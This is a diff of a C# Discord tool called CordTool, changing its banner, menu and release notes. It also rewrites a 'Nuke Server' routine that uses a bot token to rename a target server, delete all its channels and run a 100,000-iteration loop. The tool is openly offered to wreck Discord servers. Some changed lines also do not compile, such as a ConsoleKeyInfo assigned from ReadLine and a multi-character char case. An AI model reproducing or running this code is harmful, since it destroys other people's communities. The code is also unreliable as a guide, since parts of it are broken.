@@ -115,35 +115,50 @@ namespace CordTool
         static void Banner()
         {
             Console.ForegroundColor = ConsoleColor.Magenta;
-            Console.WriteLine(@"
-
-          
-       _..._       .-'''-.                                    .-'''-.        .-'''-.          
-    .-'_..._''.   '   _    \         _______                 '   _    \     '   _    \  .---. 
-  .' .'      '.\/   /` '.   \        \  ___ `'.            /   /` '.   \  /   /` '.   \ |   | 
- / .'          .   |     \  '         ' |--.\  \          .   |     \  ' .   |     \  ' |   | 
-. '            |   '      |  '.-,.--. | |    \  '      .| |   '      |  '|   '      |  '|   | 
-| |            \    \     / / |  .-. || |     |  '   .' |_\    \     / / \    \     / / |   | 
-| |             `.   ` ..' /  | |  | || |     |  | .'     |`.   ` ..' /   `.   ` ..' /  |   | 
-. '                '-...-'`   | |  | || |     ' .''--.  .-'   '-...-'`       '-...-'`   |   | 
- \ '.          .              | |  '- | |___.' /'    |  |          W tool               |   | 
-  '. `._____.-'/              | |    /_______.'/     |  |                               |   | 
-    `-.______ /               | |    \_______|/      |  '.'                             '---' 
-             `                |_|                    |   /                                    
-                                                     `'-'
-
- Made By github.com/Epicinver                      Feel free to check out the repo: github.com/epicinver/cordtool
-");
+            Console.WriteLine("       _..._       .-'''-.                                    .-'''-.        .-'''-.          ");
+            // we want a fade look
+            Console.ForegroundColor = ConsoleColor.Cyan;
+            Console.WriteLine("    .-'_..._''.   '   _    \\         _______                 '   _    \\     '   _    \\  .---. ");
+            Console.ForegroundColor = ConsoleColor.DarkCyan;
+            Console.WriteLine("  .' .'      '.\\/   /` '.   \\        \\  ___ `'.            /   /` '.   \\  /   /` '.   \\ |   | ");
+            Console.ForegroundColor = ConsoleColor.Blue;
+            Console.WriteLine(" / .'          .   |     \\  '         ' |--.\\  \\          .   |     \\  ' .   |     \\  ' |   | ");
+            Console.ForegroundColor = ConsoleColor.Magenta;
+            Console.WriteLine(". '            |   '      |  '.-,.--. | |    \\  '      .| |   '      |  '|   '      |  '|   | ");
+            Console.ForegroundColor = ConsoleColor.DarkMagenta;
+            Console.WriteLine("| |            \\    \\     / / |  .-. || |     |  '   .' |_\\    \\     / / \\    \\     / / |   | ");
+            Console.ForegroundColor = ConsoleColor.DarkGreen;
+            Console.WriteLine("| |             `.   ` ..' /  | |  | || |     |  | .'     |`.   ` ..' /   `.   ` ..' /  |   | ");
+            Console.ForegroundColor = ConsoleColor.Green;
+            Console.WriteLine(". '                '-...-'`   | |  | || |     ' .''--.  .-'   '-...-'`       '-...-'`   |   | ");
+            Console.ForegroundColor = ConsoleColor.DarkRed;
+            Console.WriteLine(" \\ '.          .              | |  '- | |___.' /'    |  |                               |   | ");
+            Console.ForegroundColor = ConsoleColor.Red;
+            Console.WriteLine("  '. `._____.-'/              | |    /_______.'/     |  |                               |   | ");
+            Console.ForegroundColor = ConsoleColor.DarkYellow;
+            Console.WriteLine("    `-.______ /               | |    \\_______|/      |  '.'                             '---' ");
+            Console.ForegroundColor = ConsoleColor.Yellow;
+            Console.WriteLine("             `                |_|                    |   /                                     ");
+            Console.ForegroundColor = ConsoleColor.Red;
+            Console.WriteLine("                                                     `'-'                                      ");
+            
             Console.ResetColor();
+            
+            Console.ForegroundColor = ConsoleColor.Yellow;
+            
+            Console.WriteLine("                              Made by https://github.com/Epicinver/CordTool :P                 ");
+            
+            Console.ResetColor();
+            
             Console.WriteLine("CordTool - A tool for managing and interacting with Discord webhooks.");
             Console.WriteLine("Developed by: Arran :)");
-            Console.WriteLine("Version: 8.0.0 (Release notes: Type P)");
+            Console.WriteLine("Version: 9.5.0 (Release notes: Type P)");
         }
         static void Menu()
         {
             Console.WriteLine("\n1. Send Webhook Message");
             Console.WriteLine("2. Nuke Server");
-            Console.WriteLine("3. Login to a Bot (IN DEV)");
+            Console.WriteLine("3. Basic CLI discord client for bots");
             Console.WriteLine("4. Nuke Server Better (Reccommended)");
             Console.WriteLine("5. oAuth2 Authorization Tracker");
             Console.WriteLine("6. Exit");
@@ -343,27 +358,24 @@ namespace CordTool
 
             Console.Write("Discord invite link: ");
             string serverInvite = Console.ReadLine();
-            for (int i = 0; i < 1000000; i++)
-            {
-                var discord = new DiscordClient(new DiscordConfiguration()
+            var discord = new DiscordClient(new DiscordConfiguration()
                 {
                     Token = Token,
                     TokenType = TokenType.Bot
                 });
+            await discord.ConnectAsync();
 
-                await discord.ConnectAsync();
+            var guild = await discord.GetGuildAsync(ulong.Parse(guildId)); // Your guild ID
+            await guild.ModifyAsync(g => g.Name = serverNameOverRide);
 
-                var guild = await discord.GetGuildAsync(ulong.Parse(guildId)); // Your guild ID
-                await guild.ModifyAsync(g => g.Name = serverNameOverRide);
+            await discord.DisconnectAsync();
 
-                await discord.DisconnectAsync();
+            Console.WriteLine("Something is happening in the Nuke function.");
 
-                Console.WriteLine("Something is happening in the Nuke function.");
-
-                var channels = await guild.GetChannelsAsync();
-                foreach (var channel in channels)
-                {
-                    try
+            var channels = await guild.GetChannelsAsync();
+            foreach (var channel in channels)
+            {
+                try
                     {
                         await channel.DeleteAsync();
 
@@ -372,9 +384,9 @@ namespace CordTool
                     {
                         Console.WriteLine($"Something is happening in the Nuke function. [technical: {ex}]");
                     }
-                }
+            }
 
-                for (int j = 0; j < 100000; j++)
+            for (int j = 0; j < 100000; j++)
                 {
                     try
                     {
@@ -389,14 +401,13 @@ namespace CordTool
                         Console.WriteLine($"Something happened during the nuke, and we don't know how to fix it. Here's the error code: {ex.Message}");
                     }
                 }
-            }
         }
         static void releaseNotes()
         {
             Console.Clear();
             Console.WriteLine("Release Notes for CordTool");
             Console.WriteLine("Type the version below.");
-            ConsoleKeyInfo input = Console.ReadKey();
+            ConsoleKeyInfo input = Console.ReadLine();
             char option = input.KeyChar;
             Console.WriteLine(option);
             switch (option)
@@ -468,7 +479,16 @@ namespace CordTool
                     Console.ReadKey();
                     Console.Clear();
                     break;
-
+                case '9':
+                    Console.WriteLine("I'm insane");
+                    Console.ReadKey();
+                    Console.Clear();
+                    break;
+                case '10':
+                    Console.WriteLine("Uh its in development (9.5 and 10 count as this)");
+                    Console.ReadKey();
+                    Console.Clear();
+                    break;
             }
         }
 
